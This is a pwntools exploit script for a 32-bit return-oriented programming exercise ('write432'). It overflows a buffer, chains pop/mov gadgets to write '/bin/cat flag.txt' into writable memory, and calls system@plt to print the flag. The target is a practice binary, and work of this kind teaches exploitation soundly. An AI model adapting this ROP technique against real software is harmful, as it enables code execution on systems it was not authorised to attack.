#!/usr/bin/env python3

from pwn import *

#ALWAYS DEBUG!
#context.log_level='DEBUG'
context(terminal=['tmux','new-window'],os='linux',arch='i386')
#p = gdb.debug('./write432','b main \n b*0x8048646')
p = process('./write432')

junk = ("A"* 44).encode()

#data_start = 0x804a028
data_start = 0x804a040
#data_start = 0x8049f14
#0x080486da: pop edi; pop ebp; ret;
load_data = p32(0x80486da)
#0x08048670 <+0>:     mov    DWORD PTR [edi],ebp
store_data = p32(0x8048670)
#08048430 <system@plt>:
system = p32(0x8048430)
#return address since the above is system's address
#in the plt so since we are jumping straight to it
#there needs to be a return_address since there's no
#call opcode to push one on
return_address = p32(0xdeadbeef)
#jump to call system so you don't have
#to push your own return address on the stack
#but where's the fun in that?
#system = p32(0x804865a)

string = '/bin/cat flag.txt'.encode()
string_1 = string[0:4]
string_2 = string[4:8]
string_3 = string[8:12]
string_4 = string[12:16]
string_5 = "t".ljust(4,"\x00").encode()

load_str_1 = load_data + p32(data_start) + string_1 + store_data
load_str_2 = load_data + p32(data_start+0x4) + string_2 + store_data
load_str_3 = load_data + p32(data_start+0x8) + string_3 + store_data
load_str_4 = load_data + p32(data_start+0xc) + string_4 + store_data
load_str_5 = load_data + p32(data_start+0x10) + string_5 + store_data
load_str = load_str_1 + load_str_2 + load_str_3 + load_str_4 + load_str_5

payload = junk+load_str+system+return_address+p32(data_start)
log.info('Payload length: %i'%len(payload))
log.info('Payload bytesize: %s'%hex(len(payload)))
p.recvuntil('>')
log.info('Sending payload')
p.sendline(payload)
log.info('Payload Sent')
#p.interactive()
flag = p.recvall()
log.success("Flag: "+flag.decode('ascii'))
